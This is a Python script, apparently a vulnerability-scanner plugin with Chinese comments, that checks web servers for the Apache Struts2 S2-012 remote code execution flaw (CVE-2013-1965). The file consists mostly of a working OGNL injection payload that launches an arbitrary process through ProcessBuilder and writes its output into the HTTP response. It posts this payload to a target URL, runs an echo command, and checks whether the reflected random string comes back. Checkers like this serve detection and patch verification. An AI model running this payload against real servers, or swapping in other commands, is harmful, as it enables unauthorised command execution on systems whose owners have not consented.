
#!/usr/bin/env python3

import random
import string
import requests

class S2_012_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-012漏洞,又名CVE-2013-1965漏洞',
            'description': 'Struts2 S2-012漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.14.2',
            'date': '2013-04-16',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if  '.action' not in self.url:
            self.url = self.url + '/user.action'
        self.capta = self.get_capta() 
        self.payload =  '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{S2_012})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'

    def filter(self, check_str):

        """
        过滤无用字符

        :param str check_str:待过滤的字符串

        :return str temp:过滤后的字符串
        """
        
        temp = ''
        for i in check_str:
            if i != '\n' and i != '\x00':
                temp = temp + i
        return temp

    def get_capta(self):
    
        """
        获取一个随机字符串

        :param:

        :return str capta: 生成的字符串
        """
        capta = ''
        words = ''.join((string.ascii_letters,string.digits))
        for i in range(8):
            capta = capta + random.choice(words)
        return capta

    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        try:
            self.check_data = {'name': self.payload.replace('S2_012', '"echo",' + '\"' + self.capta + '\"')}
            check_res = requests.post(self.url, data = self.check_data)
            check_str = self.filter(list(check_res.text))
            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_012 = S2_012_BaseVerify('http://localhost:8080/s2_012_war_exploded/index.action')
    S2_012.run()